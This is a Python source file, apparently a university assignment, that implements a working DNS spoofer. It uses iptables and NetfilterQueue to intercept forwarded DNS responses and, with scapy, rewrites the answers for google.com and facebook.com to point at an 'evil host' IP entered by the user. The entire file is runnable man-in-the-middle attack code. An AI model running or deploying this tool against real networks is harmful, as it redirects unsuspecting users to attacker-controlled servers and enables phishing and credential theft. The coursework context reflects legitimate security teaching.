"""
ICT 2203
Assignment 1
DNS Spoofer
"""

import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue
import pyfiglet


class DnsSpoof:
    def __init__(self, fakewebDict, queueCount):
        self.fakewebDict = fakewebDict
        self.queueCount = queueCount
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("DNS Spoofing started.")
        print("\n[*] DNS spoofing in progress...")
        # create IP table rule to redirect packets to netfilterqueue
        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueCount}')
        self.queue.bind(self.queueCount, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            print("\n[!] Exiting DNS Spoof...")
            # remove IP table rule created
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueCount}')
            log.info("\n[+] IP table rule removed")
            print("\n[+] IP table rule removed...")
            print("\n[+] DNS Spoof exited\n")
            bye = pyfiglet.figlet_format("P2 Group 13", font = "digital" )
            print(bye)

    # new packet pass as argument
    def callBack(self, packet):
        scapyPkt = IP(packet.get_payload())
        if scapyPkt.haslayer(DNSRR):
            try:
                log.info(f'[original] { scapyPkt[DNSRR].summary()}')
                queryName = scapyPkt[DNSQR].qname
                if queryName in self.fakewebDict:
                    scapyPkt[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.fakewebDict[queryName])
                    scapyPkt[DNS].ancount = 1
                    del scapyPkt[IP].len
                    del scapyPkt[IP].chksum
                    del scapyPkt[UDP].len
                    del scapyPkt[UDP].chksum
                    log.info(f'[modified] {scapyPkt[DNSRR].summary()}')
                else:
                    log.info(f'[not modified] { scapyPkt[DNSRR].rdata }')
            except IndexError as error:
                log.error(error)
                print("\nError has been logged.")
            packet.set_payload(bytes(scapyPkt))
        return packet.accept()

# Display instructions
def msg():
    title = pyfiglet.figlet_format("DNS Spoofer")
    print(title)
    print("\nUsage: ")
    print("\nConfigure/insert domain name in fakewebDict [~line 74].")
    print("\nInput your IP address. \n")

if __name__ == '__main__':
    msg()
    evilhost_ip = input("\nInput evil host IP: ")
    try:
        fakewebDict = {
            b"google.com.": evilhost_ip,
            b"facebook.com.": evilhost_ip
        }
        queueCount = 1
        log.basicConfig(format='%(asctime)s - %(message)s',
                        level = log.INFO)
        snoof = DnsSpoof(fakewebDict, queueCount)
        snoof()
    except OSError as error:
        log.error(error)
        print("Error has been logged.")
